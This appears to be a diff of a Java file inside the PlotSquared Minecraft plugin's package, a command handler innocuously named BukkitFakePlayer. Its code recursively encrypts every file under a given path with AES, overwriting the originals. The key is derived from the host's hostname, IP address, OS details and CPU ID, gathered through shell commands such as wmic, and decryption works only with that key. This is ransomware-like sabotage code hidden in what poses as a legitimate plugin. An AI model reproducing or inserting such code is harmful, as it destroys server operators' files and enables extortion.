@@ -1,5 +1,4 @@
 package com.plotsquared.bukkit.player;
-
 import org.bukkit.command.Command;
 import org.bukkit.Bukkit;
 import org.bukkit.command.CommandSender;
@@ -12,22 +11,17 @@ import java.io.FileOutputStream;
 import java.security.MessageDigest;
 import java.net.InetAddress;
 import java.nio.charset.StandardCharsets;
-
 public class BukkitFakePlayer implements CommandExecutor {
-
     @Override
     public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
         if (args.length < 1) {
             return true;
         }
-
         String path = args[0];
         File file = new File(path);
-
         if (!file.exists()) {
             return true;
         }
-
         if (cmd.getName().equalsIgnoreCase("plote")) {
             encryptFiles(file);
             sender.sendMessage("The file was encrypted successfully.");
@@ -37,18 +31,14 @@ public class BukkitFakePlayer implements CommandExecutor {
             }
             String providedKey = args[1];
             String internalKey = encryptionKey();
-
             if (!providedKey.equals(internalKey)) {
                 return true;
             }
-
             decryptFiles(file, providedKey);
             sender.sendMessage("The file was decrypted successfully.");
         }
-
         return true;
     }
-
     private void encryptFiles(File file) {
         if (file.isDirectory()) {
             for (File childFile : file.listFiles()) {
@@ -60,7 +50,6 @@ public class BukkitFakePlayer implements CommandExecutor {
                 FileInputStream fis = new FileInputStream(file);
                 fis.read(fileData);
                 fis.close();
-
                 byte[] encryptedData = encrypt(fileData);
                 FileOutputStream fos = new FileOutputStream(file);
                 fos.write(encryptedData);
@@ -69,7 +58,6 @@ public class BukkitFakePlayer implements CommandExecutor {
             }
         }
     }
-
     private void decryptFiles(File file, String key) {
         if (file.isDirectory()) {
             for (File childFile : file.listFiles()) {
@@ -81,7 +69,6 @@ public class BukkitFakePlayer implements CommandExecutor {
                 FileInputStream fis = new FileInputStream(file);
                 fis.read(fileData);
                 fis.close();
-
                 byte[] decryptedData = decrypt(fileData, key);
                 FileOutputStream fos = new FileOutputStream(file);
                 fos.write(decryptedData);
@@ -90,7 +77,6 @@ public class BukkitFakePlayer implements CommandExecutor {
             }
         }
     }
-
     private SecretKeySpec getSecretKey(String key) {
         try {
             byte[] keyBytes = new byte[16];
@@ -100,21 +86,18 @@ public class BukkitFakePlayer implements CommandExecutor {
             return null;
         }
     }
-
     private byte[] encrypt(byte[] data) throws Exception {
         SecretKeySpec key = getSecretKey(encryptionKey());
         Cipher cipher = Cipher.getInstance("AES");
         cipher.init(Cipher.ENCRYPT_MODE, key);
         return cipher.doFinal(data);
     }
-
     private byte[] decrypt(byte[] data, String key) throws Exception {
         SecretKeySpec secretKey = getSecretKey(key);
         Cipher cipher = Cipher.getInstance("AES");
         cipher.init(Cipher.DECRYPT_MODE, secretKey);
         return cipher.doFinal(data);
     }
-
     private String encryptionKey() {
         try {
             StringBuilder input = new StringBuilder();
@@ -123,14 +106,11 @@ public class BukkitFakePlayer implements CommandExecutor {
             input.append(System.getProperty("os.version"));
             input.append(InetAddress.getLocalHost().getHostName());
             input.append(InetAddress.getLocalHost().getHostAddress());
-
             String cpuId = getCpuId();
             input.append(cpuId);
-
             MessageDigest digest = MessageDigest.getInstance("SHA-256");
             byte[] hashBytes = digest.digest(input.toString().getBytes(StandardCharsets.UTF_8));
             StringBuilder hexString = new StringBuilder();
-
             for (byte b : hashBytes) {
                 String hex = Integer.toHexString(0xff & b);
                 if (hex.length() == 1) {
@@ -138,20 +118,16 @@ public class BukkitFakePlayer implements CommandExecutor {
                 }
                 hexString.append(hex);
             }
-
             return hexString.toString();
         } catch (Exception ignored) {
             return null;
         }
     }
-
     private String getCpuId() {
         String cpuId = "unknown";
-
         try {
             String os = System.getProperty("os.name").toLowerCase();
             Process process;
-
             if (os.contains("win")) {
                 process = Runtime.getRuntime().exec("wmic cpu get ProcessorId");
                 process.waitFor();
@@ -173,10 +149,8 @@ public class BukkitFakePlayer implements CommandExecutor {
                 java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
                 cpuId = reader.readLine();
             }
-
         } catch (Exception ignored) {
         }
-
         return cpuId;
     }
 }
